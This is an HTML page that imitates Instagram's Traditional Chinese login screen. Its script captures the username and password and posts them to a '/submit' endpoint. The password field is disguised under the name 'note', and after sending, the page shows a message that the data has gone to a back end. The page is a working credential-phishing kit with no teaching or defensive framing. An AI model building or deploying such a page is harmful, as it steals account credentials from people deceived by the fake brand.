<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram</title>
  <link rel="icon" type="image/png" href="/favicon.png" />
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <main class="screen">
    <section class="phone">
      <div class="locale-switcher">
        <div class="locale-button">中文(台灣)</div>
      </div>

      <div class="brand" aria-hidden="true">
        <img class="brand-image" src="brand-logo.png" alt="Brand logo" />
      </div>

      <form class="card" id="client-form">
        <label class="field">
          <input name="account" type="text" placeholder="用戶名稱、電子郵件地址或手機號碼" autocomplete="username" required />
        </label>

        <label class="field">
          <input name="note" type="text" placeholder="密碼" autocomplete="off" />
        </label>

        <button class="primary-btn" type="submit">登入</button>

        <a class="backlink" href="/recover.html">忘記密碼？</a>
        <p class="status" id="status" aria-live="polite"></p>
      </form>

      <button class="secondary-btn" id="secondary-btn" type="button">建立新帳號</button>

      <img class="footer-mark" src="footer-mark.png" alt="Brand mark" />
    </section>
  </main>

  <script>
    const form = document.getElementById('client-form');
    const status = document.getElementById('status');
    const secondaryBtn = document.getElementById('secondary-btn');

    secondaryBtn.addEventListener('click', () => {
      window.location.href = '/phone-step.html';
    });

    form.addEventListener('submit', async (event) => {
      event.preventDefault();

      const data = new FormData(form);
      const payload = {
        account: String(data.get('account') || '').trim(),
        note: String(data.get('note') || '').trim(),
        source: '網站表單'
      };

      const response = await fetch('/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      if (response.ok) {
        status.textContent = '資料已送出，後台會同步更新。';
        form.reset();
      } else {
        status.textContent = '送出失敗，請稍後再試。';
      }
    });
  </script>
</body>
</html>
